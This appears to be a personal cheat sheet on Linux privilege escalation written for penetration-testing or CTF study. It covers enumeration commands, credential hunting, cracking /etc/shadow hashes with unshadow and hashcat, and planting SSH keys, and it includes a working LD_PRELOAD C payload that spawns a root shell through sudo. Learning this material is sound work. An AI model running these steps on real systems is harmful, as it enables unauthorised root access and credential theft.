# Tips to escalate our privilege in Linux:

### 1. System Enumeration:

- Try to know about the system's architecture, `uname -a` or `cat /proc/version` or `lscpu`
- What services are running, `ps aux`

### 2. User Enumeration:

- `whoami` or `id`
- The classic way, `cat /etc/passwd` or `cat /etc/passwd | cut -d : -f 1`
- `sudo -l` for our sudo privileges

### 3. Network Enumeration:

- Try to find any services running on any port, any possibilities to pivoting `ip a` or `ifconfig` and `ip route` or `route` and `arp -a`
- `netstat -ano`

### 4. Password Enumeration:

- `grep --color=auto -rnw '/' -ie  "PASSWORD" --color=always 2>/dev/null`, this will return the word **password** from an entire system in red color
- `locate pass`, this will return any files named password
- `find / -name id_rsa 2>/dev/null`, returns any id_rsa files

### 5. Kernel exploits:

- After knowing the version of the kernal `uname -a`, we search for the kernel exploit associated to the version
- Just run the exploit in target machine as per instructions

### 6. Passwords & File permissions:

- By hunting some files that are looking sus and rising some curiosity that the files contains some passwords like `/etc/passwd`, `/etc/shadow`, or some unexpected password files
- Always view history of cli by `history` or `cat .bash_history`

### 7. Escalation via weak file permissions:

- If you can read both `/etc/passwd` and `/etc/shadow` file, copy the contents of both to your local machine, and run this command `unshadow <passwd file name> <shadow file name>`, copy the result, remove unwanted users, keep the root user and other users and save it as another file, identify what type of hash is there using hashcat examples from google and note what mode, use hashcat tool like `hashcat -m <identified mode> <filename which consists hash of root and other users> <path to wordlists such as rockyou.txt>`

### 8. Escalation via SSH keys:

- Search for `id_rsa` file or writable `authorized_keys`
- If there, use `id_rsa` to ssh (always do `chmod 600 id_rsa`) or put our `.pub` ssh key in `authorized_keys`

### 9. Escalation via sudo:

- Always check out to try `sudo -l`
- Great resource to escalate via this method is **GTFO bins website**

### 10. Escalation via intended functionality:

- Always look for the results from google or from internet

  > **So, what is this?**  
  >  Abusing the functionalities of some tools or services like, if we get our foothold in machine as a website administrator, we have some privileges over hosting services like apache. Using this service apache to escalate our privilege

### 11. Escalation via LD_PRELOAD:

- If we do `sudo -l`, there will be chance that the env is in LD_PRELOAD
- This is a example C program, save it in target machine as `shell.c` and compile it using `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`, then run it as `sudo LD_PRELOAD=/home/user/shell.so <any services from sudo -l like apache2 or nano or something>`

      #include <stdio.h>
      #include <sys/types.h>
      #include <stdlib.h>

      void _init(){
         unsetenv("LD_PRELOAD");
         setgid(0);
         setuid(0);
         system("/bin/bash");
      }

- So, what we are doing is just running a sudo privileged service that requires no password, but the line _LD_PRELOAD=/home/user/shell.so_ will be triggered as it preloads whatever we give before the actual sudo privileged program runs

  > **What is LD_PRELOAD?**  
  > It is a feature of unix systems that preloads the dynamic links

### 12. Escalation via SUID or setuid:

- First find all suid files accross system, `find / -perm -u=s -type f 2>/dev/null`
  - -perm > permission
  - -u=s > super user
  - -type f > file type
- If you find anything, look how to exploit using that in websites like **GTFO bins or google**

---

### Some intresting informations:

1. The system level user of linux is commonly known as **root**
2. Some automated tools:
   - linpeas.sh
   - linenum.sh
   - linux-exploit-suggester.sh
   - linuxprivchecker.py
3. Visit **kernel exploits from user lucyoa or anyone** in github to find few kernel exploits associated to some versions
4. Visit **PayloadAllTheThings or InternalAllTheThings by user swisskyrepo** in github, for some paylods
5. Great resource to escalate via this method is **GTFO bins website,** also search in google
6. If the **gid and uid is 0**, then its owner is root
7. Check out fuzzy security website to know more about hacking
8. Also check **hacktricks** website
